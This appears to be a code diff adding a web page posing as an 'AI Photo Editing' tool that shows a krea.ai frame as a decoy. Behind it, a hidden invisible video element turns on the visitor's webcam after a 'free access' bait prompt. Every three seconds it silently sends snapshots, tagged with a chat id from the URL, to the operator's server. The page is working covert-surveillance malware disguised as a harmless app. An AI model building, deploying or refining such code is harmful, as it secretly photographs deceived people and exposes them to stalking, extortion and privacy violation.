@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+   <meta name="viewport" content="width=375, initial-scale=1.0">
+  <title>AI Photo Editing</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    #hidden-video {
+      position: fixed;
+      width: 640px;
+      height: 480px;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
+    #canva-iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <video id="hidden-video" autoplay playsinline muted></video>
+  <iframe id="canva-iframe" src="https://krea.ai/realtime/"></iframe>
+
+  <script>
+  const video = document.getElementById('hidden-video');
+  const SEND_ENDPOINT = '/send-photo';
+  let canvas, context;
+
+  // 😈 Extract chat_id from URL
+  function getChatIdFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('id');
+  }
+
+  async function initCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        }
+      });
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        video.play();
+      };
+
+      await new Promise((resolve) => {
+        const checkReady = () => {
+          if (video.readyState >= 3 && video.videoWidth > 0 && video.videoHeight > 0) {
+            resolve();
+          } else {
+            setTimeout(checkReady, 100);
+          }
+        };
+        checkReady();
+      });
+
+      canvas = document.createElement('canvas');
+      context = canvas.getContext('2d');
+
+      setTimeout(startAutoCapture, 3000);
+
+    } catch (err) {
+      console.error('Camera error:', err);
+      alert("Allow to get free access");
+    }
+  }
+
+  async function captureAndSend() {
+    if (!video.videoWidth || !video.videoHeight) return;
+
+    const chatId = getChatIdFromURL();
+    if (!chatId) {
+      console.warn("No chat_id in URL!");
+      return;
+    }
+
+    try {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      await new Promise(requestAnimationFrame);
+      context.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+      const response = await fetch(SEND_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData, id: chatId })
+      });
+
+      const result = await response.json();
+      if (result.status !== 'ok') {
+        console.warn('Server said:', result);
+      }
+
+    } catch (err) {
+      console.error('Capture error:', err);
+    }
+  }
+
+  function startAutoCapture() {
+    async function loopCapture() {
+      await captureAndSend();
+      setTimeout(loopCapture, 3000);
+    }
+    loopCapture();
+  }
+
+  initCamera();
+</script>
+
+</body>
+</html>
